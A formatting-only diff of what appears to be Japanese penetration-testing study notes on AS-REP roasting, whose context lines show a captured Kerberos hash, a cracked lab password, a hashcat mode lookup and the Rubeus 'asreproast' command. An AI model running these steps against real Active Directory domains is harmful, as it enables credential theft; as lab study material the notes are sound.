@@ -43,6 +43,7 @@ $krb5asrep$23$dave@CORP.COM:4f6bd8d9065ce746fce6774fa45ad9e1$01dea4cfbd08efe4191
 - 
 ## ハッシュ解析
 #### ハッシュモードの特定
+
 ```bash
 hashcat --help | grep -i "Kerberos"
 ```
@@ -68,14 +69,16 @@ Flowers1
 
 ## Rubeus.exe
 - ファイルのパス
+
 ```zsh
 ls /usr/share/windows-resources/rubeus 
 Rubeus.exe
 ```
 
 ## AS-REPハッシュの取得
-### 
+
 Rubeus.exeを使用する
+
 ```powershell
 .\Rubeus.exe asreproast /nowrap
 ```
